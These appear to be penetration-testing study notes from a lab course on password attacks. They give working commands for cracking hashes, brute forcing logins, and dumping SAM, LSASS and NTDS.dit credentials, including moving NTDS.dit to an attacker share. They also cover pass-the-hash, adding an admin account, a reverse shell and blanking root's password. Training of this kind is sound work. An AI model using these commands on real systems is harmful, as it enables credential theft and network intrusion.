
# <mark class="hltr-pink">Credential Storage</mark>

## <mark class="hltr-cyan">Linux</mark>

In Linux passwords are stored in the form of hashes inside the /etc/shadow file

This is typically what an entry in that file looks like:
![[Pasted image 20240821014207.png]]

The hashed password is formatted as follow:
![[Pasted image 20240821014549.png]]

There are many cryptographic hash methods that can be used and we determine which one is used by looking at the $id field

![[Pasted image 20240821015221.png]]

## <mark class="hltr-cyan">Windows Authentication Process</mark>

### <mark class="hltr-orange">SAM Database</mark>

The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an `LM` hash or an `NTLM` hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

If the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\ntds.dit`.

### <mark class="hltr-orange">NTDS</mark>

In an Active Directory environment, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

---

# <mark class="hltr-pink">John The ripper</mark>

John the Ripper (`JTR` or `john`) is an essential pentesting tool used to check the strength of passwords and crack encrypted (or hashed) passwords using either brute force or dictionary attacks.

## <mark class="hltr-cyan">Cracking Modes</mark>

### <mark class="hltr-orange">Single Crack Mode</mark>

`Single Crack Mode` is one of the most common John modes used when attempting to crack passwords using a single password list. It is a brute-force attack, meaning all passwords on the list are tried, one by one, until the correct one is found.

Syntax:
```
john --format=<hash_type> <hash or hash_file>
```

Example:
```
john --format=sha256 hashes_to_crack.txt
```

When we run the command, John will read the hashes from the specified file, and then it will try to crack them by comparing them to the words in its built-in wordlist and any additional wordlists specified with the `--wordlist` option

John will output the cracked passwords to the console and the file "john.pot" (`~/.john/john.pot`) to the current user's home directory. Furthermore, it will continue cracking the remaining hashes in the background, and we can check the progress by running the `john --show` command

### <mark class="hltr-orange">Wordlist Mode</mark>

Wordlist is a dictionary attack and it is more effective than Single Crack Mode because it utilizes more words.

```shell-session
john --wordlist=<wordlist_file> --rules <hash_file>
```

### <mark class="hltr-orange">Incremental Mode</mark>

`Incremental Mode` is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one. This makes it much faster than the brute force attack, where all combinations are tried randomly.

```shell-session
john --incremental <hash_file>
```

## <mark class="hltr-cyan">Cracking Files</mark>

It is also possible to crack even password-protected or encrypted files with John. We use additional tools that process the given files and produce hashes that John can work with. It automatically detects the formats and tries to crack them.

Syntax:
```shell-session
<tool> <file_to_crack> > file.hash
john file.hash
# OR
john --wordlist=<wordlist.txt> file.hash
```

Example:

```shell-session
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
```

---

# <mark class="hltr-pink">Network Services</mark>

## <mark class="hltr-cyan">Netexec</mark>

A handy tool that we can use for our password attacks is netexec (`nxc`): a fork of crackmapexec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.

It is recommended to get familiar with the official [documentation](https://www.netexec.wiki/) of netexec.```

- netexec protocol specific help
```
nxc smb -h
```

- netexec usage
```shell-session
nxc <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

- Example
```shell-session
nxc winrm 10.129.42.197 -u user.list -p password.list
```

## <mark class="hltr-cyan">Evil-WinRM</mark>

Another handy tool that we can use to communicate with the WinRM service is [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), which allows us to communicate with the WinRM service efficiently.

```shell-session
evil-winrm -i <target-IP> -u <username> -p <password>
```

If the login was successful, a terminal session is initialized using the [Powershell Remoting Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) (`MS-PSRP`), which simplifies the operation and execution of commands.

## <mark class="hltr-cyan">SSH</mark>

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: `symmetric` encryption, `asymmetric` encryption, and `hashing`.

We can use a tool such as `Hydra` to brute force SSH.

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

## <mark class="hltr-cyan">RDP</mark>

We can also use `Hydra` to perform RDP bruteforcing.

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

Or crowbar
```
crowbar -b rdp -u Johanna -s 10.129.104.235/32 -C htb_academy/password_attacks/mut_password.list -v
```

## <mark class="hltr-cyan">SMB</mark>

[Server Message Block](https://docs.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks.

### <mark class="hltr-orange">Hydra</mark>
For SMB, we can also use `hydra` again to try different usernames in combination with different passwords.

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```


However, we may also get the following error describing that the server has sent an invalid reply:
```
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can use one of the <mark class="hltr-green">metasploit</mark> modules.

### <mark class="hltr-orange">Metasploit</mark>

```shell-session
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file pass.list
set rhosts 10.129.10.12
run
```

Now we can use netexec again to view the available shares and what privileges we have for them.

```shell-session
nxc smb 10.129.42.197 -u "user" -p "password" --shares
```

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

```shell-session
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

---

# <mark class="hltr-pink">Password Mutations</mark>

## <mark class="hltr-cyan">Hashcat</mark>

`Hashcat` and `John` come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is `best64.rule`, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases.

```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

```
$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

## <mark class="hltr-cyan">CeWL</mark>

We can now use another tool called [CeWL](https://github.com/digininja/CeWL) to scan potential words from the company's website and save them in a separate list.

```shell-session
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```


---

# <mark class="hltr-pink">Password Reuse / Default Passwords</mark>

[Default Credentials Cheat Sheet](https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv)

---

# <mark class="hltr-pink">Windows Local Password Attacks</mark>

## <mark class="hltr-cyan">Attacking SAM</mark>

### <mark class="hltr-orange">Using reg.exe save to copy SAM Registry Hives</mark>

There are three registry hives that we can copy if we have local <mark class="hltr-green">admin</mark> access on the target.

![[Pasted image 20240827035210.png]]

Launching CMD as an <mark class="hltr-green">admin</mark> will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:

```cmd-session
C:\> reg.exe save hklm\sam C:\sam.save
C:\> reg.exe save hklm\system C:\system.save
C:\> reg.exe save hklm\security C:\security.save
```

We can then send those files to our attack machine.

### <mark class="hltr-orange">Dumping Hashes with Impacket's secretsdump.py</mark>

Keep in mind that the .save files are not human readable format, thus we need a tool to extract the hashes. One incredibly useful tool we can use to dump the hashes offline is Impacket's <mark class="hltr-green">secretsdump.py</mark>.

```shell-session
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

![[Pasted image 20240827042408.png]]

we now have to crack the passwords associated with these hashes:
1. copy and paste the previous NTLM Hashes into a file called hashes.txt
2. Enter this vim cmd: `norm0f:f:df:d0$bD` to extract the nthash for each line
3. save the file

the hashes.txt should look like this
```shell-session
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

### <mark class="hltr-orange">Running hashcat against NT hashes</mark>

```shell-session
sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### <mark class="hltr-orange">Netexec SAM & LSA</mark>

#### <mark class="hltr-grey">Dumping LSA Secrets Remotely</mark>

LSA secrets is a special protected storage for important data used by the **Local Security Authority** (LSA) in Windows.

Originally, the secrets contained cached domain records. Later, Windows developers expanded the application area for the storage. At this moment, they can store PC users' text passwords, service account passwords (for example, those that must be run by a certain user to perform certain tasks), Internet Explorer passwords, RAS connection passwords, SQL and CISCO passwords, SYSTEM account passwords, private user data like EFS encryption keys, and a lot more.

❗: With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

```shell-session
sudo nxc smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

![[Pasted image 20240827045208.png]]

#### <mark class="hltr-grey">Dumping SAM Remotely</mark>

```shell-session
nxc smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## <mark class="hltr-cyan">Attacking LSASS</mark>

### <mark class="hltr-orange">What is lsass.exe</mark>

lsass.exe is a Windows process that takes care of security policy for the OS.  For example, when you logon to a Windows user account or server lsass.exe verifies the logon name and password.  If you terminate lsass.exe you will probably find yourself logged out of Windows.  lsass.exe also writes to the Windows Security Log so you can search there for failed authentication attempts along with other security policy issues.

### <mark class="hltr-orange">Dumping LSASS Process Memory</mark>

#### <mark class="hltr-grey">Task Manager Method</mark>

![[Pasted image 20240827184933.png]]

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

A file called `lsass.DMP` is created and saved in:
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

#### <mark class="hltr-grey">Rundll32.exe & Comsvcs.dll Method</mark>

The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32). This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line.
It is important to note that modern anti-virus tools recognize this method as malicious activity.


We have to find the PID of lsass.exe:
CMD:
```
tasklist /svc
```
Or
Powershell:
```
Get-Process lsass
```

Now that we have the PID of lsass.exe we can create the dump file.
With an <mark class="hltr-green">elevated PowerShell session</mark>, we can issue the following command to create the dump file:

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump (lsass' PID) C:\lsass.dmp full
```

### <mark class="hltr-orange">Using pypykatz to extract Credentials</mark>

The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file (`/home/dali/Documents/lsass.dmp`) stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

Lets take a more detailed look at some of the useful information in the output:

#### <mark class="hltr-grey">MSV</mark>

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the <mark class="hltr-green">NT</mark> & <mark class="hltr-green">SHA1</mark> password hashes associated with the bob user account's logon session stored in LSASS process memory.

❗: We can then crack to NT hash using hashcat.
```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

#### <mark class="hltr-grey">WDIGEST</mark>

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in <mark class="hltr-green">clear-text</mark>. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST.

#### <mark class="hltr-grey">Kerberos</mark>

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

#### <mark class="hltr-grey">DPAPI</mark>

The Data Protection Application Programming Interface or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.

## <mark class="hltr-cyan">Attacking AD & NTDS.DIT</mark>

Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`. That domain-joined system will now send all authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01/nameofuser`) or with direct access to the device then typing `./` at the logon UI in the `Username` field.

### <mark class="hltr-orange">Dictionary Attacks against AD accounts using NetExec</mark>

#### <mark class="hltr-grey">Creating a custom list of usernames</mark>

Many organizations follow a naming convention when creating employee usernames. Here are some common conventions to consider:

![[Pasted image 20240828010658.png]]

We can manually create our list(s) or use an `automated list generator` such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. We can run it against a list of real names as shown in the example output below:
```shell-session
./username-anarchy -i /home/ltnbob/names.txt 
```

Or a single user
```
./username-anarchy anna key
```

#### <mark class="hltr-grey">Launching the Attack with Netexec</mark>

Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as netexec. We can use it in conjunction with the SMB protocol to send logon requests to the target <mark class="hltr-green">Domain Controller</mark>. Here is the command to do so:
```
nxc smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

### <mark class="hltr-orange">Capturing NTDS.DIT (method 1)</mark>
#### <mark class="hltr-grey">Connecting to the DC</mark>
We can connect to a target DC using the credentials we captured.

```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

```shell-session
PS C:\> net localgroup
```

We are looking to see if the account has local admin rights.
❗: To make a copy of the NTDS.dit file, we need local admin (<mark class="hltr-green">Administrators group</mark>) or Domain Admin (<mark class="hltr-green">Domain Admins group</mark>) (or equivalent) rights. We also will want to check what domain privileges we have.

```shell-session
PS C:\> net user bwilliamson
```

#### <mark class="hltr-grey">Copying NTDS.DIT</mark>
We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.

❗: remember that we need local admin or domain admin rights.

```shell-session
PS C:\> vssadmin CREATE SHADOW /For=C:
```

now that we have a shadow copy of C: we can NTDS.DIT from it:
```shell-session
PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Before copying NTDS.dit to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host.

```shell-session
PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

where 10.10.15.30 is the IP of the attack machine and CompData is the name of the share

### <mark class="hltr-orange">Capturing NTDS.DIT using netexec (method 2)</mark>

```shell-session
nxc smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### <mark class="hltr-orange">Cracking a single hash with Hashcat</mark>

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20240828021554.png]]

What if we are unsuccessful in cracking a hash?

### <mark class="hltr-orange">Pass-The-Hash Considerations</mark>

We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:

```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


## <mark class="hltr-cyan">Credential Hunting</mark>

Credential Hunting is the process of performing detailed searches across the file system and through various applications to discover credentials.

### <mark class="hltr-orange">Search Tools</mark>

#### <mark class="hltr-grey">Windows Search</mark>

![[Pasted image 20240829002711.png]]

#### <mark class="hltr-grey">LaZagne</mark>

We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a [standalone copy](https://github.com/AlessandroZ/LaZagne/releases/) of Lazagne on our attack host so we can quickly transfer it over to the target. 

Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:

```cmd-session
start lazagne.exe all
```

#### <mark class="hltr-grey">findstr</mark>

We can also use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### <mark class="hltr-orange">Additional Considerations</mark>

Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

---

# <mark class="hltr-pink">Linux Local Password Attacks</mark>

## <mark class="hltr-cyan">Credential Hunting</mark>
### <mark class="hltr-orange">Configuration Files</mark>

The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.

```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### <mark class="hltr-orange">Credentials in Configuration Files</mark>

Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (`user`, `password`, `pass`) in each file with the file extension `.cnf`.

```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### <mark class="hltr-orange">Databases</mark>

```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### <mark class="hltr-orange">Notes</mark>

```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### <mark class="hltr-orange">Scripts</mark>

```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### <mark class="hltr-orange">Cronjobs</mark>

Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.

```
cat /etc/crontab
```

```
ls -alh /etc/cron.*/
```


### <mark class="hltr-orange">SSH Keys</mark>

#### <mark class="hltr-grey">Private Keys</mark>

```shell-session
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

#### <mark class="hltr-grey">Public Keys</mark>

```shell-session
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

```

### <mark class="hltr-orange">History</mark>

```shell-session
tail -n5 /home/*/.bash*
```

```
cat /home/*/.bash_history
```

### <mark class="hltr-orange">Logs</mark>

![[Pasted image 20240829092846.png]]

Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:

```shell-session
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

```

### <mark class="hltr-orange">Memory And Cache</mark>

In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.

#### <mark class="hltr-grey">minipenguin</mark>
```shell-session
sudo python3 mimipenguin.py
```

#### <mark class="hltr-grey">LaZagne</mark>

```shell-session
python3 laZagne.py all
```

### <mark class="hltr-orange">Browsers</mark>
#### <mark class="hltr-grey">Firefox Stored Credentials</mark>

```shell-session
ls -l .mozilla/firefox/ | grep default 
```

```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

#### <mark class="hltr-grey">Decrypting Firefox Credentials</mark>

```shell-session
python3.9 firefox_decrypt.py
```

#### <mark class="hltr-grey">Browsers - LaZagne</mark>

```
python3 laZagne.py browsers
```


## <mark class="hltr-cyan">Passwd, Shadow & Opasswd</mark>

### <mark class="hltr-orange">Editing /etc/passwd</mark>
If you have write permission on /etc/passwd you can edit it to gain access to the root account

Before:
```shell-session
root:x:0:0:root:/root:/bin/bash
```

After:
```shell-session
root::0:0:root:/root:/bin/bash
```

now you can log in as root
```
su root
```

### <mark class="hltr-orange">Opasswd</mark>

```shell-session
sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

### <mark class="hltr-orange">Cracking Linux Crendentials</mark>

If you have read access to /etc/shadow, you can copy the /etc/passwd and /etc/shadow files to the attack machine, and then unshadow them (used for formatting) and lastly crack the hashes

```shell-session
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### <mark class="hltr-grey">Cracking SHA-512 Hashes</mark>

```shell-session
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### <mark class="hltr-grey">Cracking MD5 Hashes</mark>

```shell-session
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

---

# <mark class="hltr-pink">Windows Lateral Movement</mark>

## <mark class="hltr-cyan">Pass The Hash (PtH)</mark>

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).

### <mark class="hltr-orange">Windows NTLM Introduction</mark>

Microsoft's [Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, ❗: Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.

With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a <mark class="hltr-green">Pass the Hash (PtH) Attack</mark>.

### <mark class="hltr-orange">Pass The Hash with Mimikatz (Windows)</mark>

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.

![[Pasted image 20240911181232.png]]

First of all we have to use the privilege::debug inside mimikatz:
```
mimikatz# privilege::debug
```

then we can try to dump hashes using sekurlsa::logonpasswords:
```
sekurlsa::logonpasswords
```

if we found some hashes we can then use them for a pth attack
mimikatz cmd:
```
sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe
```

### <mark class="hltr-orange">Pass the Hash with PowerShell Invoke-TheHash (Windows)</mark>

Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB.

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

#### <mark class="hltr-grey">Invoke-TheHash with SMB</mark>

```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

We can also get a reverse shell connection in the target machine.
To get a reverse shell, we need to start our listener using Netcat on our Windows machine, which has the IP address 172.16.1.5. We will use port 8001 to wait for the connection.

Starting the listener:
```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001
```

![[Pasted image 20240911181929.png]]

Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work).

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "revshell payload"
```

#### <mark class="hltr-grey">Invoke-TheHash with WMI</mark>

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "revshell payload"
```


### <mark class="hltr-orange">PTH with Impacket (Linux)</mark>

[Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc. For this example, we will perform command execution on the target machine using `PsExec`.

**Pass The Hash with Impacket PsExec**
```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

